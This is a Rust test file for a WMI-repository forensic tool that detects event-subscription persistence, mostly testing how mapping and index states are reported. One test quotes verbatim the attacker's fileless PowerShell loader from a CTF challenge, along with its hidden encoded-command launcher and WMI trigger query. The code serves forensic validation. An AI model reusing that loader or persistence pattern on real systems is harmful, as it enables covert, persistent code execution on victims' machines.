    assert!(enabled.contains("not in force as found"), "{enabled}");
}

/// A mapping file the neighbour bundle withheld (its name occurs twice in the
/// directory) is reported as withheld, never as not found, and the mapping
/// used is said to be possibly not the newest.
#[test]
fn a_withheld_mapping_file_is_reported_withheld_not_absent() {
    use seance_core::data_source::SiblingBundleSource;
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let relatives = [(
        "MAPPING1.MAP".to_string(),
        source(LONEWOLF_MAPPING1.to_vec()).unwrap(),
    )]
    .into_iter()
    .collect();
    let ds = SiblingBundleSource::new(source(buf).unwrap(), Default::default())
        .with_relatives(relatives)
        .with_withheld(["mapping2.map".to_string()]);
    let art = Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        Some(Arc::new(ds) as Arc<dyn DataSource>),
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    );
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["mapping_file"], json!("MAPPING1.MAP"));
    let not_found = scan["mappings_not_found"].as_array().unwrap();
    assert!(!not_found.contains(&json!("MAPPING2.MAP")), "{scan}");
    assert!(not_found.contains(&json!("MAPPING3.MAP")), "{scan}");
    assert_eq!(scan["mappings_withheld"], json!(["MAPPING2.MAP"]), "{scan}");
    let cov = entries(&produced, "AsepCoverage");
    let rows = cov[0].metadata["categories"].as_array().unwrap();
    let wmi = rows
        .iter()
        .find(|r| r["category"] == json!("wmi_event_subscription"))
        .unwrap();
    let reason = wmi["status_reason"].as_str().unwrap();
    assert!(
        reason.contains("MAPPING2.MAP") && reason.contains("withheld"),
        "{reason}"
    );
    assert!(reason.contains("may not be the newest"), "{reason}");
}

// --- binding ends and the currency the mapping establishes (HUNT-195 review) --
//
// The real Lone Wolf triad read through its real MAPPING1.MAP, with a copy of
// one of its records added in memory as though it lay in a page the mapping
// drops. No corpus holds a subscription record in an unmapped page
// (records_in_unmapped_pages is 0 on all three), so these are mechanism tests
// of which copy a binding resolves to, not validation.

fn lonewolf_triad_through_its_mapping() -> crate::wmi::ScanOutcome {
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let mut out = scan_with_mapping(&buf, Some(&lonewolf_mapping()));
    out.mapping_file = Some(("MAPPING1.MAP".to_string(), 25064));
    out
}

/// A copy of `class`'s record, placed in an unmapped page ahead of every
/// real record, with `SourceName` changed so the copy is recognisable.
fn stale_copy_of(out: &crate::wmi::ScanOutcome, class: &str, source_name: &str) -> WmiRecord {
    let mut copy = by_class(&out.records, class)[0].clone();
    copy.offset = 0x40;
    copy.page = 0;
    copy.page_state = PageState::Unmapped;
    for p in &mut copy.properties {
        if p.name == "SourceName" {
            p.value = PropValue::Str(source_name.to_string());
        }
    }
    copy
}

fn entry_named<'a>(
    entries: &'a [crate::record::AsepEntry],
    name: &str,
) -> &'a crate::record::AsepEntry {
    entries
        .iter()
        .find(|e| {
            e.entry_name == name && e.evidence_state != crate::record::EvidenceState::Superseded
        })
        .unwrap_or_else(|| panic!("no current entry named {name}"))
}

const SCM_BINDING: &str = "SCM Event Log Filter -> SCM Event Log Consumer";

#[test]
fn a_current_binding_resolves_to_the_current_consumer_not_an_earlier_superseded_copy() {
    let mut out = lonewolf_triad_through_its_mapping();
    let current = by_class(&out.records, "NTEventLogEventConsumer")[0].offset;
    let stale = stale_copy_of(&out, "NTEventLogEventConsumer", "STALE SOURCE");
    out.records.insert(0, stale);
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    let b = entry_named(&entries, SCM_BINDING);
    assert_eq!(
        b.extra["binding_consumer_record_offsets"][0],
        json!(current),
        "the current copy is the one resolved"
    );
    assert_eq!(b.extra["binding_consumer_record_current"], json!(true));
    let action = b.extra["consumer_action"].as_str().unwrap();
    assert!(!action.contains("STALE"), "{action}");
    assert!(b.incomplete_reason.is_none(), "{:?}", b.incomplete_reason);
}

#[test]
fn a_current_binding_whose_consumer_survives_only_as_a_superseded_copy_says_so() {
    let mut out = lonewolf_triad_through_its_mapping();
    let stale = stale_copy_of(&out, "NTEventLogEventConsumer", "STALE SOURCE");
    out.records
        .retain(|r| !r.class_name.eq_ignore_ascii_case("NTEventLogEventConsumer"));
    out.records.insert(0, stale);
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    let b = entry_named(&entries, SCM_BINDING);
    assert_eq!(b.extra["binding_consumer_resolved"], json!(true));
    assert_eq!(b.extra["binding_consumer_record_current"], json!(false));
    let why = b.incomplete_reason.as_deref().expect("marked incomplete");
    assert!(why.contains("superseded"), "{why}");
    assert!(why.contains("SCM Event Log Consumer"), "{why}");
    assert!(
        !b.enabled_basis.contains("in force whenever"),
        "{}",
        b.enabled_basis
    );
    assert!(
        b.enabled_basis.contains("not established"),
        "{}",
        b.enabled_basis
    );
}

#[test]
fn a_superseded_binding_is_not_counted_among_what_a_current_filter_and_consumer_are_bound_to() {
    let mut out = lonewolf_triad_through_its_mapping();
    let mut stale = by_class(&out.records, "__FilterToConsumerBinding")[0].clone();
    stale.offset = 0x40;
    stale.page = 0;
    stale.page_state = PageState::Unmapped;
    out.records.insert(0, stale);
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");

    let f = entry_named(&entries, "SCM Event Log Filter");
    assert_eq!(
        f.extra["filter_bound_consumers"],
        json!(["NTEventLogEventConsumer 'SCM Event Log Consumer'"])
    );
    assert_eq!(
        f.extra["filter_bound_consumers_not_current"],
        json!(["NTEventLogEventConsumer 'SCM Event Log Consumer'"])
    );
    assert!(f.runs_when.contains("not current"), "{}", f.runs_when);

    let c = entry_named(&entries, "SCM Event Log Consumer");
    assert_eq!(
        c.extra["consumer_bound_filters"],
        json!(["SCM Event Log Filter"])
    );
    assert_eq!(
        c.extra["consumer_bound_filters_not_current"],
        json!(["SCM Event Log Filter"])
    );

    // Only the superseded binding left: nothing current binds the filter.
    out.records.retain(|r| {
        !r.class_name
            .eq_ignore_ascii_case("__FilterToConsumerBinding")
            || r.offset == 0x40
    });
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    let f = entry_named(&entries, "SCM Event Log Filter");
    assert_eq!(f.extra["filter_bound_consumers"], json!([]));
    assert!(!f.runs_when.contains("Bound to"), "{}", f.runs_when);
    assert!(f.runs_when.contains("not current"), "{}", f.runs_when);
}

/// Every numbered mapping withheld (each name twice in the directory): the
/// coverage row says so, and never that it looked for nothing.
#[test]
fn a_repository_whose_every_mapping_is_withheld_does_not_say_it_looked_for_nothing() {
    use seance_core::data_source::SiblingBundleSource;
    let ds = SiblingBundleSource::new(source(LONEWOLF.to_vec()).unwrap(), Default::default())
        .with_relatives(Default::default())
        .with_withheld([
            "mapping1.map".to_string(),
            "mapping2.map".to_string(),
            "mapping3.map".to_string(),
        ]);
    let art = Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        Some(Arc::new(ds) as Arc<dyn DataSource>),
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    );
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let cov = entries(&produced, "AsepCoverage");
    let rows = cov[0].metadata["categories"].as_array().unwrap();
    let wmi = rows
        .iter()
        .find(|r| r["category"] == json!("wmi_event_subscription"))
        .unwrap();
    let reason = wmi["status_reason"].as_str().unwrap();
    assert!(
        !reason.contains("()") && !reason.contains("( looked"),
        "{reason}"
    );
    assert!(!reason.contains("No page mapping was found"), "{reason}");
    assert!(!reason.contains("could not look"), "{reason}");
    assert!(reason.contains("withheld"), "{reason}");
}

/// Records in unmapped pages are counted in the coverage row, and the row
/// does not call all of them superseded: a record no descriptor table lists
/// is published as recovered.
#[test]
fn the_coverage_row_does_not_call_every_record_in_an_unmapped_page_superseded() {
    let map = lonewolf_mapping();
    let logical_143 = map.inverse(LONEWOLF_PAGES)[143].unwrap();
    let mut edited = LONEWOLF_MAPPING1.to_vec();
    let at = 24 + 24 * logical_143;
    edited[at..at + 4].copy_from_slice(&u32::MAX.to_le_bytes());
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let art = repository_artifact(buf, &[("MAPPING1.MAP", &edited)]);
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let cov = entries(&produced, "AsepCoverage");
    let rows = cov[0].metadata["categories"].as_array().unwrap();
    let wmi = rows
        .iter()
        .find(|r| r["category"] == json!("wmi_event_subscription"))
        .unwrap();
    let reason = wmi["status_reason"].as_str().unwrap();
    assert!(
        !reason.contains("are reported as superseded copies"),
        "{reason}"
    );
    assert!(reason.contains("recovered"), "{reason}");
}

// --- HTB Business CTF 2022 "Perseverance": a real, attacker-planted subscription ---

/// The PowerShell the HTB write-ups publish as the persistence payload
/// (hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup), verbatim.
const PERSEVERANCE_PUBLISHED_SCRIPT: &str = "$file = ([WmiClass]'ROOT\\cimv2:Win32_MemoryArrayDevice').Properties['Property'].Value;sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";

/// A plain RFC 4648 base64 decoder, written here so the grade does not rest
/// on any decoder the crate itself ships.
fn independent_base64(s: &str) -> Vec<u8> {
    const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = Vec::new();
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes().filter(|&c| c != b'=') {
        let v = A.iter().position(|&a| a == c).expect("base64 alphabet") as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    out
}

/// The Perseverance repository (`INDEX.BTR`, `MAPPING1-3.MAP`, `OBJECTS.DATA`
/// as the challenge ships them; SHA-256s in the corpus `SHA256SUMS`), named
/// by `SEANCE_PERSEVERANCE_OBJECTS_DATA` — `WMI-3` in
/// `documentation/VALIDATION.md`. Graded against the published write-up: the
/// persistence is a filter-to-consumer binding whose consumer runs PowerShell
/// with an encoded command, and that command decodes to the script the
/// write-up prints. The consumer's class (`CommandLineEventConsumer`, not
/// `ActiveScriptEventConsumer`) and the filter's name were read independently
/// with `dissect.cim` over INDEX.BTR, the mapping and OBJECTS.DATA. The
/// repository holds no `ActiveScriptEventConsumer` instance, so this is no
/// grade of the script-consumer decode.
#[test]
fn the_perseverance_repository_holds_the_published_windows_update_persistence() {
    let Some(path) = seance_core::test_support::corpus::path("SEANCE_PERSEVERANCE_OBJECTS_DATA")
    else {
        return;
    };
    let ds = seance_core::data_source::FileDataSource::new(path).expect("open OBJECTS.DATA");
    let art = Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        Some(Arc::new(ds) as Arc<dyn DataSource>),
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    );
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let scan_json = wmi_scan_of(&produced);
    assert_eq!(scan_json["mapping_read"], json!(true), "{scan_json}");
    // dissect.cim over INDEX.BTR + mapping + OBJECTS.DATA lists, in
    // root\\subscription, two filters, one CommandLineEventConsumer, one
    // NTEventLogEventConsumer, two bindings and no ActiveScriptEventConsumer.
    assert_eq!(scan_json["records_decoded"], json!(6), "{scan_json}");
    assert_eq!(scan_json["records_in_unmapped_pages"], json!(0));

    let rows = entries(&produced, "AsepEntry");
    let consumer = rows
        .iter()
        .find(|r| {
            r.metadata["entry_name"] == "Windows Update"
                && r.metadata["wmi_record_class"] == "CommandLineEventConsumer"
        })
        .unwrap_or_else(|| {
            panic!(
                "the Windows Update consumer; rows: {:?}",
                rows.iter()
                    .map(|r| (&r.metadata["entry_name"], &r.metadata["wmi_record_class"]))
                    .collect::<Vec<_>>()
            )
        });
    let command = consumer.metadata["command"].as_str().expect("command");
    assert!(
        command.starts_with("cmd /C powershell.exe -Sta -Nop -Window Hidden -enc "),
        "{command}"
    );
    // dissect.cim reads the same CommandLineTemplate: 1540 characters, SHA-256 of its UTF-8 below.
    assert_eq!(command.len(), 1540);
    {
        use sha2::Digest;
        let digest = sha2::Sha256::digest(command.as_bytes());
        let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
        assert_eq!(
            hex,
            "696c03da2c2fe112da4b537cb1b1e6d0ab1559d938fb94fe67d0fac40fba25c7"
        );
    }
    let b64 = command.rsplit(' ').next().unwrap();
    let utf16: Vec<u16> = independent_base64(b64)
        .as_chunks::<2>()
        .0
        .iter()
        .map(|p| u16::from_le_bytes(*p))
        .collect();
    assert_eq!(
        String::from_utf16(&utf16).expect("UTF-16LE"),
        PERSEVERANCE_PUBLISHED_SCRIPT
    );
    // And the module publishes the same decode on the row, so the examiner
    // does not have to do it by hand.
    assert_eq!(
        consumer.metadata["powershell_encoded_command_decoded"],
        PERSEVERANCE_PUBLISHED_SCRIPT
    );
    assert_eq!(
        consumer.metadata["powershell_encoded_command_parameter"],
        "-enc"
    );

    let binding = rows
        .iter()
        .find(|r| r.metadata["entry_name"] == "Windows Update -> Windows Update")
        .expect("the binding row");
    assert_eq!(binding.metadata["binding_consumer_resolved"], true);
    let filter = rows
        .iter()
        .find(|r| {
            r.metadata["entry_name"] == "Windows Update"
                && r.metadata["wmi_record_class"] == "__EventFilter"
        })
        .expect("the filter row");
    // dissect.cim's reading of the same repository, verbatim.
    assert_eq!(
        filter.metadata["filter_query"],
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \
         'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND \
         TargetInstance.SystemUpTime < 325"
    );

    assert!(
        !rows
            .iter()
            .any(|r| r.metadata["wmi_record_class"] == "ActiveScriptEventConsumer"),
        "the repository holds no script consumer"
    );
}

// The real Lone Wolf triad (real pages, real mapping) with an index supplied
// in the test. The index here is synthetic: it names what the test says it
// names. These pin the mechanism of the three standings; the real indexes are
// graded in `wmi_index_tests.rs` (`WMI-4`), and no real subscription record is
// listed-but-not-indexed in any repository held.

fn triad_with_index(
    named: impl Fn(&WmiRecord) -> bool,
) -> (crate::wmi::ScanOutcome, Vec<crate::record::AsepEntry>) {
    let mut out = lonewolf_triad_through_its_mapping();
    let refs: std::collections::HashSet<_> = out
        .records
        .iter()
        .filter(|r| named(r))
        .filter_map(WmiRecord::index_key)
        .collect();
    out.apply_index(crate::wmi_index::IndexRead::Read(
        crate::wmi_index::IndexedSet {
            refs,
            pages_visited: 1,
            keys_total: 1,
            dotted_keys_not_references: 0,
        },
    ));
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    (out, entries)
}

#[test]
fn records_the_index_names_are_published_as_indexed() {
    let (out, entries) = triad_with_index(|_| true);
    assert_eq!(out.summary.records_indexed, 3);
    assert_eq!(out.summary.records_listed_not_indexed, 0);
    assert_eq!(entries.len(), 3);
    for e in &entries {
        assert_eq!(
            e.evidence_state,
            crate::record::EvidenceState::AllocatedRecord
        );
        assert_eq!(e.extra["repository_liveness"], json!("indexed"));
        assert_eq!(e.extra["record_indexed"], json!(true));
        assert_eq!(e.extra["index_walked"], json!(true));
        let basis = e.extra["scan_basis"].as_str().unwrap();
        assert!(
            basis.contains("a record the repository resolves"),
            "{basis}"
        );
        assert!(!basis.contains("was not read"), "{basis}");
    }
}

#[test]
fn a_record_a_mapped_page_lists_and_the_index_does_not_name_is_published_as_unlinked() {
    let (out, entries) = triad_with_index(|r| !r.class_name.eq_ignore_ascii_case("__EventFilter"));
    assert_eq!(out.summary.records_indexed, 2);
    assert_eq!(out.summary.records_listed_not_indexed, 1);
    let f = entries
        .iter()
        .find(|e| e.extra["wmi_record_class"] == json!("__EventFilter"))
        .expect("the filter");
    assert_eq!(f.evidence_state, crate::record::EvidenceState::Unlinked);
    assert!(f.evidence_state.is_recovered());
    assert_eq!(f.extra["repository_liveness"], json!("listed_not_indexed"));
    assert_eq!(f.extra["record_indexed"], json!(false));
    assert!(f.extra["scan_basis"]
        .as_str()
        .unwrap()
        .contains("deleted or unlinked"));
    assert!(
        f.enabled_basis.contains("not in force as found"),
        "{}",
        f.enabled_basis
    );
    // The binding is named by the index but its filter is not: the binding
    // does not claim to be in force.
    let b = entries
        .iter()
        .find(|e| e.extra["wmi_record_class"] == json!("__FilterToConsumerBinding"))
        .expect("the binding");
    assert_eq!(b.extra["repository_liveness"], json!("indexed"));
    assert_eq!(b.extra["binding_filter_record_current"], json!(false));
    assert!(
        b.incomplete_reason
            .as_deref()
            .unwrap_or("")
            .contains("the index does not name"),
        "{:?}",
        b.incomplete_reason
    );
    assert!(
        !b.enabled_basis.contains("is in force whenever"),
        "{}",
        b.enabled_basis
    );
}

#[test]
fn an_index_that_was_not_read_keeps_the_page_listing_standing_and_says_why() {
    let mut out = lonewolf_triad_through_its_mapping();
    out.index =
        crate::wmi_index::IndexRead::Unread("INDEX.BTR was not found beside the file".into());
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    for e in &entries {
        assert_eq!(
            e.extra["repository_liveness"],
            json!("in_mapped_page_index_not_read")
        );
        assert_eq!(e.extra["index_walked"], json!(false));
        assert_eq!(e.extra["record_indexed"], Value::Null);
        let basis = e.extra["scan_basis"].as_str().unwrap();
        assert!(
            basis.contains("The index (INDEX.BTR) was not read")
                && basis.contains("INDEX.BTR was not found beside the file"),
            "{basis}"
        );
    }
}

fn lonewolf_bundle(extra: Vec<(String, Arc<dyn DataSource>)>, withheld: &[&str]) -> Vec<Artifact> {
    use seance_core::data_source::SiblingBundleSource;
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let mut relatives: std::collections::HashMap<String, Arc<dyn DataSource>> =
        extra.into_iter().collect();
    relatives.insert(
        "MAPPING1.MAP".to_string(),
        source(LONEWOLF_MAPPING1.to_vec()).unwrap(),
    );
    let ds = SiblingBundleSource::new(source(buf).unwrap(), Default::default())
        .with_relatives(relatives.into_iter().collect())
        .with_withheld(withheld.iter().map(|s| s.to_string()));
    let art = Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        Some(Arc::new(ds) as Arc<dyn DataSource>),
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    );
    AsepEnumerator::new().process(&art).expect("process")
}

#[test]
fn no_index_beside_the_file_is_reported_not_found_and_liveness_stays_unestablished() {
    let produced = lonewolf_bundle(Vec::new(), &[]);
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["index_read"], json!(false));
    assert!(
        scan["index_unread_reason"]
            .as_str()
            .unwrap()
            .contains("was not found"),
        "{scan}"
    );
    for row in entries(&produced, "AsepEntry") {
        assert_eq!(
            row.metadata["repository_liveness"],
            json!("in_mapped_page_index_not_read")
        );
    }
}

#[test]
fn a_withheld_index_is_reported_withheld_not_absent() {
    let produced = lonewolf_bundle(Vec::new(), &["index.btr"]);
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["index_read"], json!(false));
    let why = scan["index_unread_reason"].as_str().unwrap();
    assert!(why.contains("withheld"), "{why}");
    assert!(!why.contains("was not found"), "{why}");
}

#[test]
fn an_index_that_does_not_fit_the_mapping_is_refused_with_a_reason() {
    // Synthetic: eight junk bytes cannot be the Lone Wolf repository's index.
    let produced = lonewolf_bundle(
        vec![("INDEX.BTR".to_string(), source(vec![0u8; 8]).unwrap())],
        &[],
    );
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["index_read"], json!(false));
    let why = scan["index_unread_reason"].as_str().unwrap();
    assert!(why.contains("INDEX.BTR was refused"), "{why}");
}
